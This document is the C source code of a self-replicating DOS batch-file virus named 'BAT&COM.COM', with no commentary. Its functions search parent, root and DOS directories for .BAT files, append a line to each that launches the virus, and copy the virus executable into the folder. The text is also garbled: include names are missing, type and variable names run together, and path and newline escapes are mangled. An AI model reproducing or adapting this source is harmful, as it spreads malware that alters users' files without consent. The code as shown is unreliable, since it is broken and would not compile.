#include
#include
#include
#include

structffblkffblk;

main () {
    charold_dir[MAXPATH];

    Get_Path( old_dir );                    
    Pick_A_Dir();                           
    Infect_Directory();                     
    chdir( old_dir );

    return(0);
}

Pick_A_Dir () {
    intdone;
    chdir( ".." );                          
    done = findfirst( "*.BAT", &ffblk, 0 ); 

    if (done){
        chdir( "//" );
        done = findfirst( "*.BAT", &ffblk, 0 );

        if (done) {
            chdir( "//DOS//" );
        }
    }

    return(0); 　
}

Infect_Directory () {
    intdone;
    done = findfirst( "*.BAT", &ffblk, 0 );

    while (!done) {                                              
        Do_Batch();                            
        done = findnext( &ffblk );              
    }

    if (findfirst( "BAT&COM.COM", &ffblk, 0 )) {
        Copy_Virus();
    }                                           

    return(0);
}

Do_Batch () {
    FILE*batch;
    charInfection_Buffer[12];
    charvpath[MAXPATH];
    
    Get_Path( vpath );     
    
    if ( vpath[3] == 0 ) {
        vpath[2] = 0;                                  
    }

    batch = fopen( ffblk.ff_name, "rt+" );
    
    fseek( batch, -11, SEEK_END );
    fread( Infection_Buffer, 11, 1, batch );
    
    Infection_Buffer[11] = 0;                               
    
    if (strcmp( Infection_Buffer, "BAT&COM.COM" )) {                                                      
        fseek( batch, 0, SEEK_END );                   
        fprintf( batch, "/n%s//BAT&COM.COM", vpath );
    } 

    fclose( batch );
    
    return(0);
}

Copy_Virus () {
    FILE*old_virus, *new_virus;
    intwrite_length;
    charcopy_buffer[1024];

    old_virus = fopen(_argv[0], "rb");
    new_virus = fopen("BAT&COM.COM", "wb");
    write_length = 1024;

    while (write_length == 1024) {
        write_length = fread(copy_buffer, 1, 1024, old_virus);
        fwrite(copy_buffer, write_length, 1, new_virus);
    }

    fclose( old_virus );
    fclose( new_virus );
    
    return(0);
}

Get_Path (char * path) {
    strcpy( path, "A://" );
    path[0] = 'A' + getdisk(); 
    getcurdir( 0, path + 3 );
    
    return(0);
}

